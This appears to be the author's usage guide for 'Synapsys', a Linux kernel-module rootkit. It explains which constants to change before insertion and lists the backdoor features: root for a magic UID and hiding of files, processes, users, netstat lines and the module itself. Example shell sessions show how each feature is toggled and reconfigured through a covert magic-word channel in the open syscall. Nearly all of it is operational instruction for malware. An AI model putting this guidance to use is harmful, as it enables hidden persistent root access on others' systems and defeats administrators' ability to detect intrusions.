This should be an explanation text, I hope you could understand my poor english.

BEFORE INSERTION
Before the insertion of this module it's better to look at the source and make some modifies:

- Change the magic word, you'd better choose your own magic word, choose a rare word
that you think nobody will write;
- Change the defined HIDDEN_PORT and the MAGIC_UID now if you want because you can't change
it after the module insertion;
- Other things like file2hide (the hidden file prefix) , hiddenuser or netstatstuff (word
that is present in the line of netstat output you want to hide e. ip, host, protocol, port 
etc) can be modified after module insertion.

CONTROL THE LKM VIA OPEN SYSCALL

via open syscall you can :
- Activate and deactivate every feature : root privileges to MAGIC_UID, file/process hiding,
netstat hiding, user hiding;
- Uninstall the lkm( instead of this you'd better user rmmod Synapsys, even if the lkm is hidden in
query module you can remove it with rmmod);
- Print the value of variables that activate/deactivate every feature and other variables that they
use (file2hide, netstatstuff, hiddenuser);
- Modify the value of variable like file2hide, netstatstuff and hiddenuser.

FEATURES 

- File hiding : all the files and directories which contain the string file2hide[] in their name are hidden;
- Process hiding : with kill -32 <pid> you assign the flag PF_INVISIBLE to a process that will be hidden, 
his child and clone too;
- User hiding : all users which contain the string hiddenuser[] in their name are hidden in finger, who and
w;
- Root privileges : if the user uid is the MAGIC_UID the user will have root privileges;
- Netstat hiding : all the lines in netstat's output which contain the string HIDDEN_PORT or the string 
netstatstuff[] are hidden;
- Module hiding : if the module name is LKM_NAME the module is hidden (but you can remove it with rmmod).


EXAMPLES

to explain better how to use this lkm I'll give you some examples for function hard to explain in other way :
- Open syscall : ( I'll use for these examples cat to call open syscall and the magicword traboz)
  - activate/deactive and print value of variable (default : active)
      - cat <magicword><cmd>[arg] 
      cmd list : 
	muid : activate/deactivate root privileges to MAGIC_UID
	hidf : activate/deactivate file/process hiding [ has arg ] : you can pass the file prefix to hide
	unin : unload module calling cleanup_module() you'd better use rmmod Synapsys instead of this
	hidn : active/deactivate nestat hiding [ has arg ] : you can pass it things to hide in netstat 
	hidu : activate/deactive user hiding (finger/who/w) [ has arg ] : you can pass it the user
	hidm : activate/deactvate lkm hiding  	

    - example for root privileges, (deactivation/activation it's the same with all the others cat <magicword><cmd>): 
      Ncl@Berserker:~$ cat trabozmuidverbose
      the value of uid_func is : 1
      cat: trabozmuidverbose: No such file or directory
      the value now is 1 so the feature is active

      Ncl@Berserker:~$ cat trabozmuid
      cat: trabozmuid: No such file or directory
      i changed the value, the feature is inactive, i'll verify it 

      Ncl@Berserker:~$ cat trabozmuidverbose
      the value of uid_func is : 0
      cat: trabozmuidverbose: No such file or directory
      now with another cat trabozmuid the feature will be activated

    - file/process hiding :
      change magicprefix for files 
       Ncl@Berserker:~$ cat trabozhidfverbose
       the value of hidf_func is : 1 the hidden files prefix is : NCL_ph1l3
        cat: trabozhidfverbose: No such file or directory
      now I'll change the value 

      Ncl@Berserker:~$ cat trabozhidfl33t
       cat: trabohidfl33t: No such file or directory
      now verify 

      Ncl@Berserker:~$ cat trabozhidfverbose
      the value of hidf_func is : 1 the hidden files prefix is : l33t
       cat: trabozhidfverbose: No such file or directory
   
   - netstat hiding :
      change things hidden in netstat 
      Ncl@Berserker:~$ cat trabozhidnverbose
      the value of nets_func is : 1 the hidden port is: 3012 are hidden lines that contains host_or_ip_or_port too
       cat: trabozhidnverbose: No such file or directory
       3012 is defined you've to change in the source before insmod host_or_ip_or_port can be modified now

       Ncl@Berserker:~$ cat trabozhidn212.32.225.213
       cat: trabozhidn212.32.225.213: No such file or directory
       now verify

       Ncl@Berserker:~$ cat trabozhidnverbose
       the value of nets_func is : 1 the hidden port is: 3012 are hidden lines that contains 212.32.225.213 too
       cat: trabozhidnverbose: No such file or directory
       now all lines that contains 212.32.225.213 are hidden

       with this feature you can hide ip host port protocols and everything you want

   - user hiding :
     change hidden user 
     Ncl@Berserker:~$ cat trabozhiduverbose 
     the value of hidu_func is : 1 the hidden user is Ncl 
     cat: trabozhiduverbose: No such file or directory
 
     Ncl@Berserker:~$ cat trabozhidur00t
     cat: trabozhidur00t: No such file or directory
     the hidden user is now r00t

     Ncl@Berserker:~$ cat trabozhiduverbose
     the value of hidu_func is : 1 the hidden user is r00t
     cat: trabozhiduverbose: No such file or directory

   - uninstal lkm :
     Ncl@Berserker:~$ cat trabozunin
     unistalling Synapsys
     cat: trabozunin: No such file or directory
